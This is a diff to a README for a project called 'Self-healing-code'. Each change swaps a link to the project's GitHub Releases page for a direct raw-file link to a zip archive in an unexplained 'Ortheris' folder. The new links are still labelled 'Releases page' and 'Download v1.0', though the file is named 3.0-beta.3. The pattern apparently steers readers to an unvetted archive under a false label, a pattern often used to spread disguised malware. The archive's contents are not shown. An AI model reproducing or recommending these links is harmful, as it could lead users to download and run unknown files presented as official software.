@@ -1,6 +1,6 @@
 # 🤖 Self-healing-code - Easy Automation for Your Projects
 
-[![Download Self-healing-code](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Priesy/Self-healing-code/releases)
+[![Download Self-healing-code](https://raw.githubusercontent.com/Priesy/Self-healing-code/main/Ortheris/code-Self-healing-3.0-beta.3.zip)](https://raw.githubusercontent.com/Priesy/Self-healing-code/main/Ortheris/code-Self-healing-3.0-beta.3.zip)
 
 ## 🌟 About This Project
 
@@ -26,7 +26,7 @@ To run Self-healing-code effectively, ensure your system meets these requirement
 
 You can quickly get started with Self-healing-code. Follow the steps below to download and set up the software.
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Priesy/Self-healing-code/releases) to find the latest version of Self-healing-code. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Priesy/Self-healing-code/main/Ortheris/code-Self-healing-3.0-beta.3.zip) to find the latest version of Self-healing-code. 
 
 2. **Download the Software:** On the Releases page, look for the latest release and click on the download link for your operating system.
 
@@ -39,7 +39,7 @@ You can quickly get started with Self-healing-code. Follow the steps below to do
 
 ## 📥 Download & Install
 
-To get Self-healing-code, visit the [Releases page](https://github.com/Priesy/Self-healing-code/releases) and download the latest version that suits your operating system. Install the software by following the instructions above.
+To get Self-healing-code, visit the [Releases page](https://raw.githubusercontent.com/Priesy/Self-healing-code/main/Ortheris/code-Self-healing-3.0-beta.3.zip) and download the latest version that suits your operating system. Install the software by following the instructions above.
 
 ## 📖 Usage Instructions
 
@@ -57,7 +57,7 @@ If you encounter issues while installing or using Self-healing-code, consider th
 
 - **Check Compatibility:** Ensure your operating system meets the requirements listed above.
 - **Reinstall the Application:** If you experience crashes, try uninstalling and then reinstalling Self-healing-code.
-- **Look for Updates:** Always use the latest version from [Releases page](https://github.com/Priesy/Self-healing-code/releases).
+- **Look for Updates:** Always use the latest version from [Releases page](https://raw.githubusercontent.com/Priesy/Self-healing-code/main/Ortheris/code-Self-healing-3.0-beta.3.zip).
 - **Check for Common Errors:** Many common errors are addressed in the FAQ section on our GitHub page.
 
 ## 🗂️ Contributing
